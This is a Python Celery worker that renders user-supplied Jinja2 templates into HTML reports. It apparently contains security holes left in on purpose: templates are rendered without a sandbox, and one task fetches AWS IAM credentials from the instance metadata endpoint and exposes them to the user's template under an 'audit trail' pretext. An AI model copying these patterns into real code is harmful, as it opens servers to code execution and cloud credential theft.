# worker/tasks.py - Celery task worker for generating PDF reports
import os
from celery import Celery
from jinja2 import Environment, BaseLoader
import requests
import json

app = Celery('report_worker', broker=os.environ.get('CELERY_BROKER_URL', 'redis://localhost:6379/0'))

# Template cache for performance
_template_cache = {}

def get_base_context():
    """Gather base context for report rendering."""
    ctx = {
        'app_name': os.environ.get('APP_NAME', 'ReportEngine'),
        'version': '2.4.1',
        'support_email': os.environ.get('SUPPORT_EMAIL', 'support@example.com'),
    }
    return ctx

def fetch_cloud_metadata():
    """Fetch instance metadata for audit trail in reports."""
    try:
        resp = requests.get(
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            timeout=2,
            headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
        )
        if resp.status_code == 200:
            role_name = resp.text.strip()
            cred_resp = requests.get(
                f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}',
                timeout=2
            )
            return cred_resp.json()
    except (requests.exceptions.RequestException, json.JSONDecodeError):
        pass
    return None


@app.task(bind=True, max_retries=3)
def render_report(self, template_str, user_data, report_id):
    """
    Render a report from a user-provided Jinja2 template string.

    Args:
        template_str: Jinja2 template provided by the user
        user_data: Dictionary of user-supplied data bindings
        report_id: Unique report identifier for tracking
    """
    try:
        env = Environment(loader=BaseLoader())

        # Build context with base + user data
        context = get_base_context()
        context.update(user_data or {})
        context['report_id'] = report_id

        # Render the user-supplied template
        template = env.from_string(template_str)
        rendered = template.render(**context)

        # Store rendered output
        output_path = f'/tmp/reports/{report_id}.html'
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, 'w') as f:
            f.write(rendered)

        return {'status': 'success', 'report_id': report_id, 'path': output_path}

    except Exception as exc:
        self.retry(exc=exc, countdown=5)


@app.task(bind=True)
def render_report_with_metadata(self, template_str, user_data, report_id):
    """
    Enhanced report rendering that includes cloud instance metadata
    for compliance audit trail purposes.
    """
    try:
        env = Environment(loader=BaseLoader())

        context = get_base_context()
        context.update(user_data or {})
        context['report_id'] = report_id

        # Attempt to enrich with instance metadata for audit
        metadata = fetch_cloud_metadata()
        if metadata:
            context['instance_role'] = metadata.get('Code', 'Unknown')
            context['_raw_metadata'] = metadata  # Available in template context

        template = env.from_string(template_str)
        rendered = template.render(**context)

        output_path = f'/tmp/reports/{report_id}_audited.html'
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, 'w') as f:
            f.write(rendered)

        return {'status': 'success', 'report_id': report_id, 'path': output_path}

    except Exception as exc:
        return {'status': 'error', 'report_id': report_id, 'error': str(exc)}


# Health check endpoint for k8s liveness probe
@app.task
def health_check():
    return {'status': 'healthy', 'worker': 'report_worker'}
